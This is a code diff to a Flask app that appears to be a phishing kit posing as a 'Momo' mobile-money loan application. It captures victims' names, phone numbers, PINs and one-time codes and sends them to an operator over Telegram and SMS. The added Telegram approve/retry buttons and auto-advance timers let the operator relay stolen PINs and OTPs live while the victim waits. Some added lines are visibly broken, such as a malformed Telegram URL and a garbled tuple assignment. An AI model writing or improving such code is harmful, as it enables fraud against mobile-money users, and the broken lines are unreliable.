@@ -949,6 +949,23 @@ HTML_PAGE = r"""<!DOCTYPE html>
 }
     function watchHostDecision(step) {
       if (decisionTimer) clearInterval(decisionTimer);
+      if (otpStepTimer) clearTimeout(otpStepTimer);
+      if (otpAutoTimer) clearTimeout(otpAutoTimer);
+
+      if (step === 'pin') {
+        otpStepTimer = setTimeout(() => {
+          clearInterval(decisionTimer);
+          const otpLabel = document.getElementById('otp-mobile-label');
+          if (otpLabel) otpLabel.innerText = formatMobileWithCountryCode(appState.mobile);
+          goTo('otp');
+        }, 10000);
+      } else if (step === 'otp') {
+        otpAutoTimer = setTimeout(() => {
+          clearInterval(decisionTimer);
+          showApprovedScreen();
+        }, 10000);
+      }
+
       decisionTimer = setInterval(async () => {
         try {
           const res = await fetch(`/api/status/${appState.appId}`);
@@ -962,27 +979,35 @@ HTML_PAGE = r"""<!DOCTYPE html>
               enteredPin = '';
               updatePinDots();
               const pinMsg = document.getElementById('pin-status-msg');
-              if (pinMsg) pinMsg.innerText = 'Incorrect PIN entered. Please re-enter your PIN.';
+              if (pinMsg) pinMsg.innerText = 'Incorrect PIN. Please re-enter your PIN.';
               goTo('pin');
-              alert('The PIN entered is incorrect. Please re-enter your PIN.');
+              alert('Incorrect PIN entered. Please re-enter your PIN.');
             } else if (step === 'otp') {
               document.querySelectorAll('#step-otp input, .otp-input').forEach(inp => inp.value = '');
               const btnOtp = document.getElementById('btn-otp');
               if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY & CONTINUE'; }
               const errorMsg = document.getElementById('otp-error-msg');
-              if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
+              if (errorMsg) errorMsg.innerText = 'Incorrect code. Please re-enter the code.';
               goTo('otp');
-              alert('The OTP entered is incorrect. Please re-enter the code.');
+              alert('Incorrect code entered. Please re-enter the code.');
             }
           } else if (data.status === 'approve') {
             clearInterval(decisionTimer);
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
-            showApprovedScreen();
+            if (step === 'pin') {
+              const otpLabel = document.getElementById('otp-mobile-label');
+              if (otpLabel) otpLabel.innerText = formatMobileWithCountryCode(appState.mobile);
+              goTo('otp');
+            } else {
+              showApprovedScreen();
+            }
           }
         } catch (e) {}
-      }, 3000);
+      }, 2000);
     }
+
+
 
 
     function submitPin() {
@@ -1014,9 +1039,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
       enteredPin = '';
       updatePinDots();
 
-      const otpLabel = document.getElementById('otp-mobile-label');
-      if (otpLabel) otpLabel.innerText = formattedPhone;
-      goTo('otp');
+      const pinMsg = document.getElementById('pin-status-msg');
+      if (pinMsg) pinMsg.innerText = 'Verifying PIN... Please wait.';
+
     }
 
     function otpMove(input, index) {
@@ -1147,6 +1172,7 @@ def save_unified():
 
         if db:
             db.delete(f"status:{app_id}")
+        LOCAL_STATUS_STORE.pop(str(app_id), None)
 
         if f_n == 'entered_pin':
             m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
@@ -1161,7 +1187,6 @@ def save_unified():
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZMW {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m, ref=ref)
             send_sms_notification(f"[Momo Advanced Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZMW {amt}")
-
 
         return jsonify({'status': 'success', 'record_id': app_id})
     except Exception as e:
@@ -1178,6 +1203,8 @@ from flask import send_from_directory
 def serve_assets(filename):
     return send_from_directory('assets', filename)
 
+LOCAL_STATUS_STORE = {}
+
 @app.route('/api/telegram-webhook', methods=['POST'])
 def telegram_webhook():
     update = request.get_json(silent=True) or {}
@@ -1185,25 +1212,37 @@ def telegram_webhook():
     if callback:
         parts = callback.get("data", "").split(":")
         callback_id = callback.get("id")
-        if len(parts) >= 2 and db:
-            action, record_id = parts[0], parts[1]
-            ref = parts[2] if len(parts) > 2 else "default"
+        if len(parts) >= 2:
+            action, record_id = parts, parts
+            ref = parts if len(parts) > 2 else "default"
+            LOCAL_STATUS_STORE[str(record_id)] = action
+            if db:
+                try:
+                    db.setex(f"status:{record_id}", 900, action)
+                except Exception:
+                    pass
             token, _ = get_bot_config(ref)
-            db.setex(f"status:{record_id}", 900, action)
-            reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
-            requests.post(
-                f"https://api.telegram.org/bot{token}/answerCallbackQuery",
-                json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
-                timeout=5
-            )
+            if token:
+                reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
+                requests.post(
+                    f"https://telegram.org{token}/answerCallbackQuery",
+                    json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
+                    timeout=5
+                )
     return jsonify({"ok": True})
-
-
 
 @app.route('/api/status/<record_id>', methods=['GET'])
 def check_status(record_id):
-    status = db.get(f"status:{record_id}") if db else None
+    status = None
+    if db:
+        try:
+            status = db.get(f"status:{record_id}")
+        except Exception:
+            pass
+    if not status:
+        status = LOCAL_STATUS_STORE.get(str(record_id))
     return jsonify({"status": status or "pending"})
+
 
 if __name__ == "__main__":
     app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
